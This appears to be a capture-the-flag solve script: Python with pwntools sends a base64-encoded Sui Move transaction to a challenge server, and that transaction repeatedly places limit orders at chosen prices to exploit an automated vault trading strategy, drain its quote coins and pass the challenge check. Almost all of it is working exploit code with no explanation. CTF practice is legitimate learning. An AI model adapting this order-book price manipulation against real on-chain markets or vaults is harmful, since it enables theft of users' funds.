a = r'''
        let lot_size: u64 = 10_000_000;
        let decimals: u64  = 1_000_000_000;
        let bid: bool = true;
        let u64_max: u64 = 18446744073709551615;
        let no_restriction: u8 = 0;
        let buy_threshold: u64 = 1_950_000_000;
        let limit: u64 = 2_000_000_000;
        let sell_threshold: u64 = 2_050_000_000;
        let crit: u64 = 1_880_000_000;

        let base_coin = ctf::get_airdrop_base(storage, 300 * decimals, ctx);
        let quote_coin = ctf::get_airdrop_quote(storage, 600 * decimals, ctx);

        let pool = ctf::get_mut_pool(storage);
        let account_cap: custodian_v2::AccountCap = clob_v2::create_account(ctx);
        


        let amount_hcoin = coin::value(&base_coin);
        let amount_cusd = coin::value(&quote_coin);
        let (remaining_hcoin, remaining_cusd) = clob_v2::place_market_order(
            pool,
            &account_cap,
            0,
            250 * decimals,
            !bid,
            coin::split(&mut base_coin, amount_hcoin, ctx),
            coin::split(&mut quote_coin, amount_cusd, ctx),
            clock,
            ctx,
        );

        coin::join(&mut base_coin, remaining_hcoin);
        coin::join(&mut quote_coin, remaining_cusd);


        let amount_hcoin = coin::value(&base_coin);
        let amount_cusd = coin::value(&quote_coin);
        let (remaining_hcoin, remaining_cusd) = clob_v2::place_market_order(
            pool,
            &account_cap,
            0,
            501 * decimals,
            bid,
            coin::split(&mut base_coin, amount_hcoin, ctx),
            coin::split(&mut quote_coin, amount_cusd, ctx),
            clock,
            ctx,
        );

        coin::join(&mut base_coin, remaining_hcoin);
        coin::join(&mut quote_coin, remaining_cusd);


        let amount_hcoin = coin::value(&base_coin);
        let amount_cusd = coin::value(&quote_coin);

        clob_v2::deposit_base(pool, base_coin, &account_cap);
        clob_v2::deposit_quote(pool, quote_coin, &account_cap);



        let i = 0;

        //// clear bids
        while(i <= 6) {
            clob_v2::place_limit_order<HCOIN, CUSD>(
                pool,
                0,
                sell_threshold,
                lot_size,
                0,
                bid,
                u64_max,
                no_restriction,
                clock,
                &account_cap,
                ctx,
            );
           
            otter_strategy::execute(
                pool,
                vault,
                !bid,
                clock,
                ctx,
            );

            i = i + 1;
        };


        let i = 0;
        while(i <= 20) {
            clob_v2::place_limit_order<HCOIN, CUSD>(
                pool,
                0,
                sell_threshold,
                lot_size,
                0,
                bid,
                u64_max,
                no_restriction,
                clock,
                &account_cap,
                ctx,
            );
            let (base_avail, base_locked, quote_avail, quote_locked) =  clob_v2::account_balance<HCOIN, CUSD>(pool, &account_cap);
            let amt = (((quote_avail as u128) * (decimals as u128) / (crit as u128)) as u64);
            clob_v2::place_limit_order<HCOIN, CUSD>(
                pool,
                0,
                crit,
                amt - (amt % lot_size),
                0,
                bid,
                u64_max,
                no_restriction,
                clock,
                &account_cap,
                ctx,
            );
            otter_strategy::execute(
                pool,
                vault,
                !bid,
                clock,
                ctx,
            );
            let (base_avail, base_locked, quote_avail, quote_locked) =  clob_v2::account_balance<HCOIN, CUSD>(pool, &account_cap);




            clob_v2::place_limit_order<HCOIN, CUSD>(
                pool,
                0,
                buy_threshold,
                lot_size,
                0,
                !bid,
                u64_max,
                no_restriction,
                clock,
                &account_cap,
                ctx,
            );
            let (base_avail, base_locked, quote_avail, quote_locked) =  clob_v2::account_balance<HCOIN, CUSD>(pool, &account_cap);
            clob_v2::place_limit_order<HCOIN, CUSD>(
                pool,
                0,
                limit,
                base_avail - base_avail % lot_size,
                0,
                !bid,
                u64_max,
                no_restriction,
                clock,
                &account_cap,
                ctx,
            );
            otter_strategy::execute(
                pool,
                vault,
                bid,
                clock,
                ctx,
            );

            i = i + 1;
        };




        let (base_avail, base_locked, quote_avail, quote_locked) =  clob_v2::account_balance<HCOIN, CUSD>(pool, &account_cap);

        let qcoin = clob_v2::withdraw_quote(
            pool,
            2500 * decimals,
            &account_cap,
            ctx,
        );

        ctf::solve(storage, &qcoin);

        transfer::public_transfer(account_cap, tx_context::sender(ctx));
        transfer::public_transfer(qcoin, tx_context::sender(ctx));
'''

import base64
bdata = base64.b64encode(a.encode('ascii', 'strict')).decode()

from pwn import *

r = remote("lightbook.chal.crewc.tf", 1337)

r.sendlineafter('your solve script using base64 encode:', bdata)

r.interactive()